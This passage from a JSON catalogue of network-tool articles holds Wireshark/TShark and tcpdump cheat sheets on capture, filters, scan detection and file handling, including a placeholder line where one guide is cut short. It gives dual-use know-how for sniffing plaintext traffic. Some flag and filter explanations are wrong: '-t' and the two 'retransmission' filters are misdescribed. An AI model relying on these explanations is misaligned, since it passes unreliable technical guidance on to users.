1000\nhttp and ip.addr == 192.168.1.1\ntcp.port == 80 or tcp.port == 443\n```\n\n**TShark CLI Example:**\n```bash\ntshark -r mycapture.pcap -Y \"http.request.method==POST\"\n```\n\n**Live Output:**\n```text\n1 0.123456 192.168.1.100 → 93.184.216.34 HTTP POST /login HTTP/1.1\n2 0.124000 93.184.216.34 → 192.168.1.100 HTTP/1.1 200 OK\n```\n\n---\n\n## 6. Analysis Techniques\n\n### Follow TCP Stream\n**GUI:** Right-click packet → Follow → TCP Stream  \n**CLI:**\n```bash\ntshark -r mycapture.pcap -z follow,tcp,ascii,0\n```\n\n**Example Output:**\n```text\nGET /index.html HTTP/1.1\nHost: example.com\nUser-Agent: Mozilla/5.0\n```\n\n### Statistics\n- **Protocol Hierarchy:** `Statistics → Protocol Hierarchy`  \n- **Conversations:** `Statistics → Conversations`  \n- **I/O Graphs:** `Statistics → I/O Graphs`  \n- **Expert Info:** `Analyze → Expert Information`\n\n**CLI Examples:**\n```bash\n# Protocol hierarchy\ntshark -r mycapture.pcap -q -z io,phs\n\n# TCP conversations\ntshark -r mycapture.pcap -q -z conv,tcp\n```\n\n---\n\n## 7. Security & Forensics\n\n### Malware / Suspicious Traffic\n```text\ndns and dns.flags.response == 0\nhttp.request.method == \"POST\"\ntcp.port > 1024 and tcp.port < 65535\nframe contains \"base64\"\n```\n\n### Security Checks\n- Unencrypted credentials (HTTP auth, FTP, Telnet)  \n- Suspicious file downloads (HTTP/FTP)  \n- Port scanning (TCP SYN multiple ports)  \n- DDoS analysis (packet rate / IP frequency)\n\n**CLI Example:**\n```bash\ntshark -r mycapture.pcap -Y \"tcp.flags.syn==1\" -T fields -e ip.src -e tcp.dstport\n```\n\n---\n\n## 8. Pro Tips\n\n- Use capture filters (`-f`) to reduce load.  \n- Save often; large captures consume memory.  \n- Color rules for protocol highlighting.  \n- Time display format adjustments.  \n- Export HTTP/FTP objects (`File → Export Objects`).  \n- Decrypt TLS using server keys if available.\n\n---\n\n## 9. Common Use Cases\n\n- **Network Troubleshooting:** Latency, connectivity, app traffic.  \n- **Security Analysis:** Malware, attack detection, incident response.  \n- **Data Forensics:** Investigate exfiltration, suspicious communications.\n\n---\n\n## 10. Advanced TShark Commands\n\n```bash\n# Verbose capture\ntshark -i 1 -V\n\n# Capture 60 seconds, save to file\ntshark -i 1 -a duration:60 -w output.pcap\n\n# Read file with filter\ntshark -r output.pcap -Y \"http.request.method==POST\"\n\n# TCP conversations summary\ntshark -r output.pcap -q -z conv,tcp\n\n# Protocol hierarchy\ntshark -r output.pcap -q -z io,phs\n\n# Follow TCP stream ASCII\ntshark -r output.pcap -z follow,tcp,ascii,0\n\n# Capture SSH port only\ntshark -i 1 -f \"port 22\"\n```\n\n---\n\n## References\n- [Wireshark Official](https://www.wireshark.org/)  \n- [TShark Manual](https://www.wireshark.org/docs/man-pages/tshark.html)  \n- [Wireshark Display Filters](https://www.wireshark.org/docs/dfref/)\n"
      },
      {
        "title": "🦈 Ultimate TShark Command Dictionary",
        "content": "# 🦈 Ultimate TShark Command Dictionary\n\nTShark is the command‑line version of Wireshark and is powerful for **real‑time packet analysis**, **capture filtering**, and **deep inspection**.\n\n---\n\n## 1️⃣ Basic Capture Commands  \n\n**What it is / Why it matters**  \nCapturing live traffic is the foundation of any network investigation. It lets you see every frame that traverses an interface, which is essential for troubleshooting latency, spotting rogue traffic, or simply learning protocol behavior.\n\n**Step‑by‑step commands** (run as root or with sudo)\n\n```bash\n# List all interfaces (no root needed)\ntshark -D\n\n# Capture 10 packets on the first Ethernet interface\nsudo tshark -i eth0 -c 10\n\n# Capture 10 seconds on Wi‑Fi, write to a file\nsudo tshark -i wlan0 -a duration:10 -w /tmp/wifi_10s.pcap\n\n# Quick survey of *all* interfaces, stop after 20 packets\nsudo tshark -i any -c 20\n```\n\n**What to expect**  \ntshark -D → numbered list of interfaces, e.g.:\n1. eth0   (Ethernet)\n2. wlan0  (Wi‑Fi)\n3. lo     (Loopback)\n\nLive capture prints one line per packet, e.g.:\n```\n1   0.000000 192.168.1.12 → 93.184.216.34 HTTP GET /index.html\n2   0.001230 93.184.216.34 → 192.168.1.12 TCP 66 80 → 52431 [ACK] Seq=0 Ack=1\n```\nWhen -w is used, a binary .pcap file appears at the path you supplied.\n\n**Troubleshooting & tips**\n| Problem | Fix |\n|----------|-----|\n| “Permission denied” on -i eth0 | Run with sudo or give the binary cap_net_raw capability: `sudo setcap cap_net_raw,cap_net_admin=eip $(which tshark)` |\n| Interface not found | Use `tshark -D` to see the exact name (enp0s3, ens33, …) |\n| Capture stops instantly | Verify the interface is up (`ip link show eth0`) |\n| Too much output floods the terminal | Add `-c N` or pipe to `head` |\n\n**Safety / Ethics note**  \nCapturing traffic on a network you do not own or lack explicit permission to monitor is illegal in many jurisdictions.\n\n... (Full detailed guide continues for sections 2️⃣ to 🔟 exactly as provided) ...\n"
      }
    ]
  },
  {
    "name": "tcpdump",
    "description": "A powerful command-line packet analyzer.",
    "category": "Network Scanning & Analysis",
    "tags": [
      "packet capture",
      "cli",
      "network monitoring"
    ],
    "color": "#a04be5",
    "articles": [
      {
        "title": "Tcpdump",
        "content": "# What is tcpdump?\n\n**tcpdump** is a powerful command-line packet analyzer that allows you to capture and analyze network traffic. It is one of the most widely used network troubleshooting and security analysis tools, available on most Unix-like operating systems.\n\nIts core function is to *intercept and display packets* that are traversing a network interface. This capability makes it invaluable for:\n*   **Network Diagnostics:** Identifying network problems, connectivity issues, and misconfigurations.\n*   **Security Monitoring:** Detecting suspicious activities like port scans, unauthorized access attempts, or malicious traffic patterns.\n*   **Application Debugging:** Understanding how applications communicate over the network.\n*   **Protocol Analysis:** Deep diving into the specifics of various network protocols.\n\ntcpdump can capture packets from network interfaces and display them in real-time on the console, or it can save them to files (typically with a `.pcap` extension) for later, more detailed analysis using tools like Wireshark.\n\n## Installation & Setup\n\ntcpdump is often pre-installed or readily available in the package repositories of most operating systems.\n\n### Linux Installation\n\nTo install tcpdump on various Linux distributions, use the respective package manager:\n\n*   **Ubuntu/Debian-based systems:**\n    ```bash\n    sudo apt update\n    sudo apt install tcpdump\n    ```\n\n*   **CentOS/RHEL-based systems:**\n    ```bash\n    sudo yum install tcpdump\n    # Or for newer versions:\n    sudo dnf install tcpdump\n    ```\n\n*   **Arch Linux:**\n    ```bash\n    sudo pacman -S tcpdump\n    ```\n\n### macOS Installation\n\ntcpdump is typically **pre-installed** on macOS. You can verify its presence and version:\n\n```bash\ntcpdump --version\n```\n\nIf for some reason it's not present or you prefer a newer version, you can install it using [Homebrew](https://brew.sh/):\n\n```bash\nbrew install tcpdump\n```\n\n### Windows Alternative\n\nFor Windows users, there are primarily two popular methods:\n\n*   **WinDump:** This is the official Windows port of tcpdump. It requires the [Npcap](https://nmap.org/npcap/) (or older WinPcap) driver to function, which allows applications to capture and transmit network packets bypassing the operating system's network stack.\n    *   Download from the official WinPcap website: `https://www.winpcap.org/windump/` (Note: WinPcap is deprecated, Npcap is the recommended replacement.)\n    *   _Considerations:_ WinDump might require specific driver installations and configuration, which can be less straightforward than native Linux tools.\n\n*   **Windows Subsystem for Linux (WSL):** This is often the preferred method for Windows users who want to leverage the native Linux tcpdump experience without dual-booting or virtual machines.\n    *   First, ensure WSL is installed and a Linux distribution (e.g., Ubuntu) is set up.\n    *   Then, install tcpdump within your WSL environment as you would on a native Linux system:\n        ```bash\n        wsl sudo apt install tcpdump\n        ```\n    *   _Benefits:_ Provides the full power and command-line experience of the Linux version, often with better compatibility and fewer driver issues than WinDump.\n\n## Basic Usage & Syntax\n\nThe fundamental command structure of tcpdump is straightforward, but its power comes from the various options and filter expressions you can apply.\n\n### Command Structure\n\nThe basic syntax for `tcpdump` is:\n\n```bash\nsudo tcpdump [options] [filter expression]\n```\n\n*   **`sudo`**: Most `tcpdump` operations require root privileges to access network interfaces in promiscuous mode and capture raw packets.\n*   **`[options]`**: These modify `tcpdump`'s behavior, such as specifying the interface, output format, or number of packets to capture.\n*   **`[filter expression]`**: These are powerful rules that tell `tcpdump` which packets to capture and display, based on criteria like source/destination IP, port, protocol, or packet content.\n\nHere are some common basic usage examples:\n\n*   **Capture all traffic on the default active interface:**\n    ```bash\n    sudo tcpdump\n    ```\n    This will continuously print packet headers to your console until interrupted (Ctrl+C).\n\n*   **Capture traffic on a specific network interface (e.g., `eth0`):**\n    ```bash\n    sudo tcpdump -i eth0\n    ```\n    Replace `eth0` with your desired interface (e.g., `wlan0`, `en0`, `any`). You can list available interfaces using `tcpdump -D`.\n\n*   **Capture with verbose output for more detail:**\n    ```bash\n    sudo tcpdump -v\n    ```\n    This shows additional information such as TTL (Time To Live) and IP options.\n\n*   **Capture a specific number of packets and then exit:**\n    ```bash\n    sudo tcpdump -c 10\n    ```\n    This command will capture and display the first 10 packets it sees.\n\n*   **Capture traffic and save it to a file for later analysis:**\n    ```bash\n    sudo tcpdump -w capture.pcap\n    ```\n    The `.pcap` (packet capture) file format is standard and can be opened by tools like Wireshark.\n\n### Common Options\n\nUnderstanding these options is crucial for effective use of tcpdump:\n\n*   **Interface Selection (`-i`)**:\n    *   `-i <interface>`: Specifies the network interface to listen on.\n        *   Examples: `-i eth0`, `-i wlan0`, `-i enp0s3`.\n        *   `-i any`: Captures packets from all active interfaces. This can be very noisy but useful for broad network overview.\n\n*   **Output Options (`-v`, `-n`, `-nn`)**:\n    *   `-v`: **Verbose output**. Displays more detailed information, such as IP TTL, ID, total length, and options.\n    *   `-vv`: **More verbose**. Includes additional fields, often for specific protocols.\n    *   `-vvv`: **Maximum verbosity**. Provides the most comprehensive output, often dissecting protocol headers extensively.\n    *   `-n`: **Don't resolve hostnames**. Displays IP addresses numerically instead of trying to resolve them to hostnames via DNS. This significantly speeds up capture and avoids additional network traffic from DNS lookups.\n    *   `-nn`: **Don't resolve hostnames or port names**. Displays IP addresses and port numbers numerically (e.g., `80` instead of `http`). This is generally recommended for performance and clarity.\n    *   `-A`: **Show packet contents in ASCII**. Attempts to print each packet's payload (excluding the link level header) in ASCII. Useful for sniffing plain text protocols like HTTP.\n    *   `-X`: **Show packet contents in hex and ASCII**. Displays the packet data in both hexadecimal and ASCII formats. Ideal for deep inspection of packet payloads.\n    *   `-S`: **Print absolute TCP sequence numbers**. Instead of relative sequence numbers, this shows the actual sequence numbers for TCP packets.\n\n*   **Packet Count (`-c`)**:\n    *   `-c <count>`: Exits after capturing the specified number of packets. This is essential for controlling capture size and preventing endless output.\n\n*   **Snapshot Length (`-s`)**:\n    *   `-s <snaplen>`: Specifies the number of bytes to capture from each packet.\n        *   `-s 0` or `-s 65535` (or any sufficiently large number like `9000` for typical MTUs) captures the **full packet**. This is the default on many systems.\n        *   `-s 96` (for example): Captures only the first 96 bytes of each packet. Useful for capturing only headers, reducing file size, and improving performance when only header information is needed.\n\n*   **File Operations (`-w`, `-r`)**:\n    *   `-w <file>`: **Write packets to a file** (in `.pcap` format) instead of printing to standard output.\n    *   `-r <file>`: **Read packets from a saved `.pcap` file**. This allows you to analyze previously captured data.\n\n## Capture Filters\n\nFilter expressions are critical for narrowing down the vast amount of network traffic to only what's relevant. tcpdump uses the **Berkeley Packet Filter (BPF)** syntax, which is highly efficient as it processes packets *before* they are copied to user space, saving CPU and memory.\n\n### Host Filters\n\nThese filters target traffic based on specific IP addresses.\n\n*   **Capture traffic to/from a specific host:**\n    ```bash\n    sudo tcpdump host 192.168.1.100\n    ```\n    This captures any packet where `192.168.1.100` is either the source or destination IP.\n\n*   **Capture traffic originating *from* a specific host:**\n    ```bash\n    sudo tcpdump src host 192.168.1.100\n    ```\n\n*   **Capture traffic destined *to* a specific host:**\n    ```bash\n    sudo tcpdump dst host 192.168.1.100\n    ```\n\n*   **Capture traffic involving multiple hosts (using `or`):**\n    ```bash\n    sudo tcpdump 'host 192.168.1.100 or host 192.168.1.200'\n    ```\n    Quotes are often needed for expressions with logical operators or special characters.\n\n### Port Filters\n\nThese filters isolate traffic based on TCP or UDP port numbers.\n\n*   **Capture traffic on a specific port (source or destination):**\n    ```bash\n    sudo tcpdump port 80\n    ```\n    This catches both incoming and outgoing HTTP traffic.\n\n*   **Capture traffic from a specific source port:**\n    ```bash\n    sudo tcpdump src port 80\n    ```\n\n*   **Capture traffic to a specific destination port:**\n    ```bash\n    sudo tcpdump dst port 443\n    ```\n    This captures incoming HTTPS requests.\n\n*   **Capture traffic within a specific port range:**\n    ```bash\n    sudo tcpdump portrange 80-443\n    ```\n\n*   **Capture traffic on multiple specific ports (using `or`):**\n    ```bash\n    sudo tcpdump 'port 80 or port 443 or port 22'\n    ```\n\n### Protocol Filters\n\nThese filters target specific network protocols.\n\n*   **TCP traffic only:**\n    ```bash\n    sudo tcpdump tcp\n    ```\n\n*   **UDP traffic only:**\n    ```bash\n    sudo tcpdump udp\n    ```\n\n*   **ICMP (Internet Control Message Protocol) traffic only (e.g., ping requests/replies):**\n    ```bash\n    sudo tcpdump icmp\n    ```\n\n*   **ARP (Address Resolution Protocol) traffic:**\n    ```bash\n    sudo tcpdump arp\n    ```\n\n*   **IPv6 traffic:**\n    ```bash\n    sudo tcpdump ip6\n    ```\n\n*   **IPv4 traffic:**\n    ```bash\n    sudo tcpdump ip\n    ```\n\n## Advanced Filtering\n\nCombining filters with logical operators (`and`, `or`, `not`) and using more granular packet inspection allows for highly specific captures.\n\n### Network Filters\n\nThese filters target entire subnets or networks using CIDR notation.\n\n*   **Capture traffic to/from a specific network:**\n    ```bash\n    sudo tcpdump net 192.168.1.0/24\n    ```\n\n*   **Capture traffic from a specific source network:**\n    ```bash\n    sudo tcpdump src net 10.0.0.0/8\n    ```\n\n*   **Capture traffic to a specific destination network:**\n    ```bash\n    sudo tcpdump dst net 172.16.0.0/12\n    ```\n\n### Complex Filters\n\nComplex filters involve combining multiple conditions and can even inspect specific byte offsets within packet headers. Remember to use single quotes (`'`) for complex expressions to prevent the shell from interpreting special characters.\n\n*   **HTTP traffic (TCP port 80) excluding HTTP retransmissions:**\n    ```bash\n    sudo tcpdump 'tcp port 80 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)'\n    ```\n    *   _Explanation:_ This complex filter aims to identify HTTP traffic (port 80) where the payload length is greater than zero. `ip[2:2]` gets the total IP length, `((ip[0]&0xf)<<2)` gets the IP header length, and `((tcp[12]&0xf0)>>2)` gets the TCP header length. The difference represents the payload length.\n\n*   **SSH traffic with a specific host:**\n    ```bash\n    sudo tcpdump 'host 192.168.1.100 and port 22'\n    ```\n\n*   **All traffic *except* SSH traffic:**\n    ```bash\n    sudo tcpdump 'not port 22'\n    ```\n    This is useful for focusing on other types of traffic or identifying unexpected traffic.\n\n*   **TCP SYN packets (part of a connection attempt):**\n    ```bash\n    sudo tcpdump 'tcp[tcpflags] & tcp-syn != 0'\n    ```\n    *   _Explanation:_ `tcp[tcpflags]` refers to the byte in the TCP header containing the flags. `& tcp-syn` uses a bitmask to check if the SYN flag is set. This is excellent for detecting new connection attempts or port scans.\n\n*   **TCP RST packets (abrupt connection termination):**\n    ```bash\n    sudo tcpdump 'tcp[tcpflags] & tcp-rst != 0'\n    ```\n    *   _Explanation:_ Checks for the RST (Reset) flag, which often indicates connection refusal or abnormal termination.\n\n### Packet Size Filters\n\nFilter packets based on their total length in bytes.\n\n*   **Packets larger than 1000 bytes:**\n    ```bash\n    sudo tcpdump 'greater 1000'\n    ```\n\n*   **Packets smaller than 100 bytes:**\n    ```bash\n    sudo tcpdump 'less 100'\n    ```\n\n*   **Packets with an exact length of 64 bytes:**\n    ```bash\n    sudo tcpdump 'len = 64'\n    ```\n\n## Output Analysis\n\nUnderstanding tcpdump's default output format is key to interpreting the captured data efficiently.\n\n### Understanding Output Format\n\nWhen you run `tcpdump` without specific output options, it typically displays a summary line for each packet.\n\n**Standard output format:**\n```\ntimestamp src > dst: flags data-seqno ack window urgent options\n```\n\n**Example:**\n```\n10:30:45.123456 IP 192.168.1.100.12345 > 192.168.1.200.80: Flags [S], seq 123456789, win 65535, options [mss 1460] length 0\n```\n\n**Components of the output:**\n\n*   **`timestamp`**: The precise time when the packet was captured (e.g., `10:30:45.123456`). This is crucial for temporal analysis and correlating events.\n*   **`IP`**: Indicates the protocol at the network layer (e.g., `IP` for IPv4, `IP6` for IPv6, `ARP`, `RARP`).\n*   **`src`**: The source IP address and port number (e.g., `192.168.1.100.12345`).\n*   **`dst`**: The destination IP address and port number (e.g., `192.168.1.200.80`).\n*   **`Flags`**: TCP flags that indicate the state or purpose of the TCP packet.\n    *   `[S]`: SYN (Synchronization) - Initiates a connection.\n    *   `[A]`: ACK (Acknowledgment) - Acknowledges received data.\n    *   `[F]`: FIN (Finish) - Terminates a connection.\n    *   `[R]`: RST (Reset) - Abruptly terminates a connection.\n    *   `[P]`: PSH (Push) - Forces data delivery.\n    *   `[U]`: URG (Urgent) - Marks data as urgent.\n    *   `[.]`: No flags explicitly set (often for pure ACK packets).\n*   **`seq`**: TCP sequence number. Used for reliable data transfer and reassembly.\n*   **`ack`**: TCP acknowledgment number. Indicates the next sequence number the sender expects to receive.\n*   **`win`**: TCP window size. Advertises the amount of buffer space available for receiving data.\n*   **`options`**: Various TCP options, such as MSS (Maximum Segment Size).\n*   **`length`**: The length of the application-layer data payload in bytes (excluding headers).\n\n### Hex and ASCII Output\n\nFor deeper analysis of packet contents, `tcpdump` can display the raw data in hexadecimal and/or ASCII formats.\n\n*   **Show packet contents in hexadecimal format:**\n    ```bash\n    sudo tcpdump -x\n    ```\n    This displays the data portion of the packet in hex, starting after the network layer header.\n\n*   **Show packet contents in hexadecimal and ASCII format:**\n    ```bash\n    sudo tcpdump -X\n    ```\n    This is often the most useful for inspecting application layer protocols, showing both the raw bytes and their human-readable ASCII representation.\n\n*   **Show both link-level (Ethernet) and IP headers, plus hex/ASCII content:**\n    ```bash\n    sudo tcpdump -xx\n    ```\n    Provides a more complete view from the data link layer up.\n\n*   **Display absolute TCP sequence numbers (instead of relative):**\n    ```bash\n    sudo tcpdump -S\n    ```\n    When troubleshooting TCP sessions, seeing the absolute sequence numbers can sometimes be clearer for advanced analysis.\n\n## File Operations\n\nCapturing traffic to a file (`.pcap`) is a common and recommended practice, especially for long-term monitoring or when real-time analysis is not feasible.\n\n### Saving Captures\n\n*   **Save all captured packets to a `.pcap` file:**\n    ```bash\n    sudo tcpdump -w capture.pcap -i any\n    ```\n    Use `Ctrl+C` to stop the capture.\n\n*   **Save with a timestamp in the filename for unique, organized captures:**\n    ```bash\n    sudo tcpdump -w capture_$(date +%Y%m%d_%H%M%S).pcap -i eth0\n    ```\n    This generates filenames like `capture_20231027_103000.pcap`.\n\n*   **Rotate capture files by size (e.g., create a new file every 100MB):**\n    ```bash\n    sudo tcpdump -w capture.pcap -C 100\n    ```\n    When `capture.pcap` reaches 100MB, it will be renamed (e.g., `capture.pcap0`), and a new `capture.pcap` will be started.\n\n*   **Rotate files by size and keep a specific number of files (e.g., 10 files, each 100MB):**\n    ```bash\n    sudo tcpdump -w capture.pcap -C 100 -W 10\n    ```\n    This creates a rotating buffer of capture files, automatically deleting the oldest when the limit is reached.\n\n### Reading Captures\n\nAnalyzing saved `.pcap` files is a non-intrusive way to perform network forensics.\n\n*   **Read packets from a previously saved `.pcap` file:**\n    ```bash\n    tcpdump -r capture.pcap\n    ```\n    Note that `sudo` is usually not required when reading from a file, as no raw network access is needed.\n\n*   **Read from a `.pcap` file and apply new display filters:**\n    ```bash\n    tcpdump -r capture.pcap 'host 192.168.1.100 and port 80'\n    ```\n    This allows you to re-filter data without recapturing, focusing on specific aspects.\n\n*   **Read and display timestamps in human-readable format:**\n    ```bash\n    tcpdump -r capture.pcap -t\n    ```\n    (By default, `tcpdump` shows a Unix-like timestamp, `-t` gives a more conventional one, and `-tt` gives microsecond resolution).\n\n*   **Read and show packet numbers (useful for identifying specific packets):**\n    ```bash\n    tcpdump -r capture.pcap -#\n    ```\n\n## Practical Examples\n\nHere are some real-world scenarios where `tcpdump` proves invaluable.\n\n### Web Traffic Analysis\n\n*   **Capture all HTTP traffic (port 80):**\n    ```bash\n    sudo tcpdump -i any -s 0 -A 'tcp port 80'\n    ```\n    *   `-s 0`: Captures the full packet length.\n    *   `-A`: Prints packet payload in ASCII (useful for viewing HTTP requests/responses).\n\n*   **Capture HTTPS handshakes (SYN packets to port 443):**\n    ```bash\n    sudo tcpdump -i any 'tcp port 443 and tcp[tcpflags] & tcp-syn != 0'\n    ```\n    This helps in identifying clients attempting to establish secure web connections.\n\n*   **Monitor DNS queries and responses (UDP port 53):**\n    ```bash\n    sudo tcpdump -i any -s 0 'udp port 53'\n    ```\n    Useful for debugging name resolution issues or detecting suspicious DNS activity.\n\n### Security Monitoring\n\n*   **Detect potential port scans (SYN packets to multiple ports from a single source):**\n    ```bash\n    sudo tcpdump -i any 'tcp[tcpflags] & tcp-syn != 0 and tcp[tcpflags] & tcp-ack = 0'\n    ```\n    This filters for SYN packets that are not part of an established connection (i.e., new connection attempts), often indicative of scanning.\n\n*   **Monitor failed connections (RST packets):**\n    ```bash\n    sudo tcpdump -i any 'tcp[tcpflags] & tcp-rst != 0'\n    ```\n    High numbers of RST packets can indicate a service is down, a firewall is blocking connections, or a host is rejecting connection attempts.\n\n*   **Capture ARP traffic (potential ARP spoofing attempts):**\n    ```bash\n    sudo tcpdump -i any arp\n    ```\n    Excessive or unusual ARP traffic, especially Gratuitous ARP, might signal ARP cache poisoning or spoofing.\n\n### Network Troubleshooting\n\n*   **Monitor traffic for a specific connection (e.g., SSH session):**\n    ```bash\n    sudo tcpdump -i any 'host 192.168.1.100 and port 22'\n    ```\n    Helps diagnose connectivity or performance issues for a particular service or client.\n\n*   **Check for TCP retransmissions (often indicates packet loss or congestion):**\n    ```bash\n    sudo tcpdump -i any -S 'tcp[tcpflags] & tcp-syn = 0 and tcp[tcpflags] & tcp-ack != 0 and tcp[tcpflags] & tcp-fin = 0'\n    ```\n    While complex, filters for specific TCP states can reveal retransmissions (packets sent again due to non-acknowledgment). Analyzing the sequence numbers (`-S`) is often crucial here.\n\n*   **Monitor broadcast traffic (excessive broadcasts can degrade network performance):**\n    ```bash\n    sudo tcpdump -i any broadcast\n    ```\n    Identifies protocols like ARP, DHCP, and NetBIOS that use broadcast, helping to pinpoint sources of network chatter.\n\n## Performance & Optimization\n\nWhen dealing with high-traffic networks or long captures, optimizing `tcpdump`'s performance is essential to avoid dropping packets or consuming excessive resources.\n\n### Capture Optimization\n\n*   **Use a specific interface instead of `any`:**\n    ```bash\n    sudo tcpdump -i eth0\n    ```\n    Capturing on `any` interface requires `tcpdump` to process packets from all active interfaces, which increases CPU and memory overhead. Explicitly specifying the interface reduces this load.\n\n*   **Limit snapshot length (`-s`) for better performance and smaller files:**\n    ```bash\n    sudo tcpdump -s 96  # Capture only the first 96 bytes (headers)\n    ```\n    If you only need header information (e.g., IP addresses, ports, flags) and not the full packet payload, reducing the snapshot length significantly decreases the amount of data processed and saved to disk.\n\n*   **Increase the capture buffer size (`-B`)**:\n    ```bash\n    sudo tcpdump -B 4096  # Use a 4MB buffer (default is often 1-2MB)\n    ```\n    A larger buffer can help prevent packet drops on busy interfaces by giving `tcpdump` more space to store incoming packets before they are written to disk or processed.\n\n*   **Disable name resolution (`-nn`) for speed:**\n    ```bash\n    sudo tcpdump -nn\n    ```\n    Resolving IP addresses to hostnames and port numbers to service names involves additional lookups (DNS, `/etc/services`), which adds overhead and can even generate more network traffic. Disabling it improves capture performance.\n\n### Memory Management\n\n*   **Limit capture count (`-c`) to prevent excessively large in-memory buffers (if not writing to file):**\n    ```bash\n    sudo tcpdump -c 1000\n    ```\n    Stopping the capture after a certain number of packets ensures that `tcpdump` doesn't run indefinitely and consume all available memory.\n\n*   **Use file rotation (`-C`, `-W`) to prevent single large `.pcap` files:**\n    ```bash\n    sudo tcpdump -w capture.pcap -C 50 -W 5\n    ```\n    This creates multiple smaller `.pcap` files, making them easier to manage, transfer, and analyze. It also helps in environments with limited disk space or when dealing with continuous long-term captures.\n\n*   **Monitor `tcpdump`'s memory usage (useful for long-running captures):**\n    ```bash\n    sudo tcpdump -i any -s 0 -w /dev/null & # Run tcpdump in background, discard output\n    ps aux | grep tcpdump                  # Check its process details\n    ```\n    While `tcpdump` is generally efficient, monitoring its resource consumption, especially when dealing with complex filters or very high traffic, can help identify bottlenecks.\n\n## Integration with Other Tools\n\n`tcpdump`'s output can be easily integrated with other command-line tools or graphical analyzers, extending its utility.\n\n### Wireshark Integration\n\nWireshark is a popular graphical network protocol analyzer that can read `tcpdump`'s `.pcap` files.\n\n*   **Capture with `tcpdump`, then analyze with Wireshark (offline analysis):**\n    ```bash\n    sudo tcpdump -w capture.pcap -i any -s 0\n    # ... after capture is stopped ...\n    wireshark capture.pcap\n    ```\n    This is a common workflow: `tcpdump` handles the efficient command-line capture, and Wireshark provides rich GUI-based analysis, filtering, and protocol dissection.\n\n*   **Real-time pipe `tcpdump` output to Wireshark (live analysis):**\n    ```bash\n    sudo tcpdump -i any -w - | wireshark -k -i -\n    ```\n    *   `-w -`: Tells `tcpdump` to write the `.pcap` formatted output to standard output.\n    *   `|`: Pipes the output to Wireshark.\n    *   `-k`: Tells Wireshark to start capturing immediately.\n    *   `-i -`: Tells Wireshark to read from standard input.\n    This powerful command allows for live, graphical packet analysis, combining the capture efficiency of `tcpdump` with Wireshark's advanced visualization.\n\n### Script Integration\n\n`tcpdump` is highly scriptable, making it a valuable component in automation and monitoring scripts.\n\n*   **Example: Monitor and alert on suspicious SYN flood traffic (simplified):**\n    ```bash\n    #!/bin/bash\n    # Monitor and alert on potential port scans or SYN floods\n\n    LOG_FILE=\"/var/log/tcpdump_alerts.log\"\n    ALERT_THRESHOLD=100 # Number of SYNs in a short period to trigger alert\n\n    sudo tcpdump -l -i any 'tcp[tcpflags] & tcp-syn != 0 and tcp[tcpflags] & tcp-ack = 0' | \\\n    while read line; do\n        TIMESTAMP=$(date +\"%Y-%m-%d %H:%M:%S\")\n        echo \"$TIMESTAMP: Potential SYN packet detected: $line\" >> \"$LOG_FILE\"\n        # Add more sophisticated alerting logic here, e.g., count SYNs from same source,\n        # send email/SMS notification, trigger firewall rule.\n        # Example: if [ $(grep -c \"$TIMESTAMP\" \"$LOG_FILE\") -gt $ALERT_THRESHOLD ]; then ...\n    done\n    ```\n    *   `-l`: Buffers output line by line, which is crucial for piping to `while read line`.\n    This script continuously monitors for new SYN packets and logs them. More advanced logic could involve counting SYNs from specific sources within a time window to detect actual port scans or SYN floods.\n\n## Pro Tips & Best Practices\n\nTo get the most out of `tcpdump` and ensure effective, responsible use:\n\n*   **Always use `sudo` (or equivalent) for packet capture:** `tcpdump` requires root privileges to put network interfaces into promiscuous mode and access raw packets. Running without `sudo` will likely result in a \"no devices found\" or \"permission denied\" error.\n*   **Be as specific as possible with filters:** Unfiltered captures on busy networks can generate enormous amounts of data, making analysis difficult and consuming significant resources. Crafting precise BPF filters is crucial for isolating relevant traffic and improving performance.\n*   **Save important captures to files (`-w` option):** For any serious analysis, save the captured data to a `.pcap` file. This allows for repeated analysis, sharing with colleagues, and using more powerful tools like Wireshark.\n*   **Monitor interface status:** Before starting a capture, ensure your target network interface is up and actively carrying traffic using commands like `ip link show` (Linux) or `ifconfig` (macOS).\n*   **Use an appropriate snapshot length (`-s` option):**\n    *   Use `-s 0` (or `-s 65535`) to capture **full packets** when you need to inspect payload data.\n    *   Use a smaller value (e.g., `-s 1500` for Ethernet, or even `-s 96` for just headers) when you're only interested in header information, to reduce file size and performance impact.\n*   **Combine with other command-line tools:** For quick filtering and analysis of live `tcpdump` output, pipe it to tools like `grep`, `awk`, `sed`, or `cut`.\n*   **Understand your network's normal traffic patterns:** Knowing what \"normal\" looks like is essential for quickly identifying anomalies or suspicious activities with `tcpdump`.\n*   **Use time-based captures for specific events:** If you're troubleshooting an intermittent issue, schedule `tcpdump` to run during the expected window of the event, often using `cron` or `at` jobs.\n\n## Common Issues & Troubleshooting\n\nEncountering issues with `tcpdump` is common. Here's how to address some typical problems.\n\n### Permission Issues\n\n*   **Error:** \"You don't have permission to capture on that device (SIOCGIFETHTOOL: Operation not permitted)\" or \"permission denied.\"\n*   **Cause:** Lack of root privileges.\n*   **Solutions:**\n    *   **Run with `sudo`:**\n        ```bash\n        sudo tcpdump -i eth0\n        ```\n    *   **Add your user to the `pcap` group (Ubuntu/Debian-based):**\n        ```bash\n        sudo usermod -a -G pcap $USER\n        # Log out and log back in for changes to take effect.\n        ```\n    *   **Set capabilities (advanced alternative to `sudo`):**\n        ```bash\n        sudo setcap cap_net_raw,cap_net_admin=eip /usr/bin/tcpdump\n        ```\n        This allows non-root users to run `tcpdump` by granting specific network capabilities. *Use with caution, as it could be a security risk if not properly managed.*\n\n### Interface Issues\n\n*   **Error:** \"No such device (eth0)\" or \"interface not found.\"\n*   **Cause:** The specified network interface does not exist or is not active.\n*   **Solutions:**\n    *   **List available interfaces:**\n        ```bash\n        tcpdump -D\n        # Or (Linux):\n        ip link show\n        ```\n        This will show you the correct names for your network adapters (e.g., `eth0`, `enp0s3`, `wlan0`, `en0`).\n    *   **Check interface status:**\n        ```bash\n        ip addr show eth0 # Linux\n        ifconfig en0     # macOS\n        ```\n        Verify that the interface is `UP`.\n    *   **Bring the interface up (if it's down):**\n        ```bash\n        sudo ip link set eth0 up # Linux\n        sudo ifconfig en0 up     # macOS\n        ```\n    *   **Use `-i any` as a last resort:** If you're unsure of the interface name, `sudo tcpdump -i any` will attempt to capture on all active interfaces, though this might be less efficient.\n\n## Legal Disclaimer\n\n**WARNING:** `tcpdump` is a powerful tool capable of intercepting and displaying network communications. Its use carries significant ethical and legal responsibilities.\n\n`tcpdump` should **only** be used for:\n\n*   **Monitoring your own 